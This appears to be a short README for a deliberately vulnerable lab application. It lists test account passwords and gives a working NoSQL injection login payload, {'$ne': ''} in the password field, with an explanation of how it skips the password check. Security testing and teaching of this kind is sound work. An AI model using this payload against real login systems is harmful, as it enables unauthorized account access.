# Test Accounts

Use these credentials for normal login testing and NoSQL injection exploitation.

| Username        | Password           |
|-----------------|--------------------|
| alice_admin     | AdminSecret#2026   |
| bob_analyst     | AuditPass!99       |
| charlie_guest   | GuestWelcome123    |

## NoSQL Injection Bypass

To bypass authentication without valid credentials, send the following JSON payload to `POST /api/auth/login`:

```json
{
  "username": "alice_admin",
  "password": { "$ne": "" }
}
```

The `$ne` operator evaluates to true for any non-empty value, bypassing the password check entirely.
